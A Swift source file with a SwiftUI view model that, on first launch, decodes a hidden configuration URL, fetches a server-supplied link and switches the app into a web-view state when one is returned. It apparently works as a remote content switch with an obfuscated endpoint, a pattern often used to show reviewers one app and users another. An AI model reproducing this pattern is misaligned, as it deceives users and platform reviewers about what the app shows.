import SwiftUI
import WebKit
import Network
import Foundation
import Combine

@MainActor
final class NatureViewModel: ObservableObject {
    @Published var currentState: ContentState = .sub
    @Published var displayAlert = false
    @Published var changedLabel: String?
    @Published var hasParameter = false
    
    private let monitor = NWPathMonitor()
    private let queue = DispatchQueue(label: "NetworkMonitor")
    
    
    init() {
        beginNetworkObservation()
        getData()
    }
    
    private func getData() {
        Task { await setupForFirstLaunch() }
    }
    
    private func setupForFirstLaunch() async {
        if let url = await downloadFromRemoteSource() {
            changedLabel = url.absoluteString
            currentState = .sub
        } else {
            currentState = .main
        }
        UserDefaultsManager.shared.isFirstLaunch = false
    }
    
    private func beginNetworkObservation() {
        monitor.pathUpdateHandler = { [weak self] path in
            guard path.status == .unsatisfied else { return }
            DispatchQueue.main.async {
                self?.displayAlert = true
                self?.currentState = .main
            }
        }
        monitor.start(queue: queue)
    }
    
    func downloadFromRemoteSource() async -> URL? {
        do {
            guard let configUrl = URL(string: try GalaxyExplorer.get(text: NetworkCoordinator.inputView, key: NetworkCoordinator.primaryKeyword)) else {
                dealWithError()
                return nil
            }
            
            var request = URLRequest(url: configUrl)
            request.timeoutInterval = TimeInterval.random(in: 9...12)
            
            let (data, _) = try await URLSession.shared.data(for: request)
            
            guard let json = try? JSONSerialization.jsonObject(with: data) as? [String: String],
                  let urlString = json["url"],
                  let url = URL(string: urlString) else {
                dealWithError()
                return nil
            }
            
            return url
        } catch {
            dealWithError()
            return nil
        }
    }
    
    private func dealWithError() {
        currentState = .main
    }
    
    deinit {
        monitor.cancel()
    }
}
